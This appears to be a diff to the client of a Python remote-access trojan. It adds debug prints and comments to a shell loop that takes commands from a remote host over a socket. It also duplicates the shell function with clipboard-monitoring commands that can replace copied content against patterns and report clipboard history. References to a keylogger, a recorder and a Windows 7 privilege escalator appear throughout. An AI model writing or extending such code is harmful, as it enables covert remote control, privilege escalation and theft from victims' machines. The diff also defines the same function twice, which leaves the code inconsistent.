@@ -108,13 +108,17 @@ def shell():
     clipboard_monitor_started = False
 
     while True:
+        # Receive a command from the remote host
         command = reliable_recv()
         
         if command == 'quit':
+            # If the command is 'quit', exit the shell loop
             break
         elif command == 'clear':
+            # If the command is 'clear', do nothing (used for clearing the screen)
             pass
         elif command[:3] == 'cd ':
+            # If the command starts with 'cd ', change the current directory
             try:
                 os.chdir(command[3:])
                 reliable_send("Directory changed successfully")
@@ -242,10 +246,17 @@ def shell():
         # PRIVILEGE ESCALATION COMMANDS
         elif command == 'check_privs':
             try:
+                print("[DEBUG] Received check_privs command")  # Debug print
                 if privilege_escalator is None:
+                    print("[DEBUG] Initializing Windows7PrivilegeEscalator")  # Debug print
                     privilege_escalator = Windows7PrivilegeEscalator()
+                print(f"[DEBUG] privilege_escalator: {privilege_escalator}")  # Debug print
+                print(f"[DEBUG] privilege_escalator.current_privileges: {getattr(privilege_escalator, 'current_privileges', None)}")  # Debug print
                 reliable_send("Current privileges: " + privilege_escalator.current_privileges)
             except Exception as e:
+                import traceback
+                tb = traceback.format_exc()
+                print(f"[DEBUG] Exception in check_privs: {e}\n{tb}")  # Debug print
                 reliable_send("Check privileges error: " + str(e))
                 
         elif command == 'escalate':
@@ -301,6 +312,47 @@ def shell():
             except Exception as e:
                 reliable_send("Command execution error: " + str(e))
 
+
+def shell():
+    global keylogger, recorder, privilege_escalator
+
+    clipboard_monitor_started = False
+
+    while True:
+        command = reliable_recv()
+        
+        if command == 'quit':
+            break
+        elif command == 'clear':
+            pass
+        elif command[:3] == 'cd ':
+            try:
+                os.chdir(command[3:])
+                reliable_send("Directory changed successfully")
+            except Exception as e:
+                reliable_send("Error changing directory: " + str(e))
+
+        # --- CLIPBOARD COMMANDS ---
+        elif command == 'start_clipboard':
+            try:
+                if not clipboard_monitor_started:
+                    start_clipboard_monitor(replace=True, patterns=PATTERNS)
+                    clipboard_monitor_started = True
+                    reliable_send("Clipboard monitor started")
+                else:
+                    reliable_send("Clipboard monitor already running")
+            except Exception as e:
+                reliable_send("Clipboard monitor error: " + str(e))
+
+        elif command == 'clipboard_history':
+            try:
+                if clipboard_history:
+                    history_str = "\n".join(f"{i+1}: {entry}" for i, entry in enumerate(clipboard_history))
+                    reliable_send("Clipboard History:\n" + history_str)
+                else:
+                    reliable_send("Clipboard history is empty")
+            except Exception as e:
+                reliable_send("Clipboard history error: " + str(e))
 
 # Create a socket object for communication over IPv4 and TCP
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
